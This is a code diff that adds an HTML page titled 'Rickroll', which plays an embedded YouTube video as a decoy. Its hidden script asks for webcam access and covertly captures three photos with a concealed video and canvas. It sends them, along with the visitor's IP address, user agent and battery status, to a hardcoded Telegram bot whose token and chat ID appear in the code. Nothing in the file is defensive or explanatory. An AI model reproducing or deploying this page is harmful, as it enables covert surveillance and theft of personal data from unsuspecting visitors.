@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Rickroll</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    iframe {
+      width: 100%;
+      height: 100vh;
+      border: none;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<iframe 
+  src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" 
+  allow="autoplay; encrypted-media" 
+  allowfullscreen>
+</iframe>
+
+<video id="video" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+  const BOT_TOKEN = '7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA';
+  const CHAT_ID = '7650029381';
+  const TOTAL_CAPTURES = 3;
+  const INTERVAL = 3000;
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const context = canvas.getContext('2d');
+
+  function sendToTelegram(text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text
+      })
+    });
+  }
+
+  function sendPhoto(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    }).catch(err => console.error("Failed to send photo:", err));
+  }
+
+  function captureAndSend() {
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+      sendPhoto(blob);
+    }, "image/jpeg", 0.95);
+  }
+
+  // Fetch IP and battery/device info
+  async function sendDeviceInfo() {
+    let ip = 'Unknown';
+    let batteryInfo = 'Unavailable';
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      ip = data.ip;
+    } catch {}
+
+    try {
+      const battery = await navigator.getBattery();
+      batteryInfo = `Battery: ${(battery.level * 100).toFixed(0)}% | Charging: ${battery.charging}`;
+    } catch {}
+
+    const deviceInfo = `Device Info:\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\n${batteryInfo}`;
+    sendToTelegram(deviceInfo);
+  }
+
+  // Init all
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+      sendDeviceInfo();
+
+      video.onloadedmetadata = () => {
+        let count = 0;
+        const intervalId = setInterval(() => {
+          if (count >= TOTAL_CAPTURES) {
+            clearInterval(intervalId);
+            stream.getTracks().forEach(track => track.stop());
+          } else {
+            captureAndSend();
+            count++;
+          }
+        }, INTERVAL);
+      };
+    })
+    .catch(err => {
+      console.warn("Camera access denied", err);
+      sendToTelegram("Camera access denied or failed.");
+      sendDeviceInfo();
+    });
+</script>
+
+</body>
+</html>
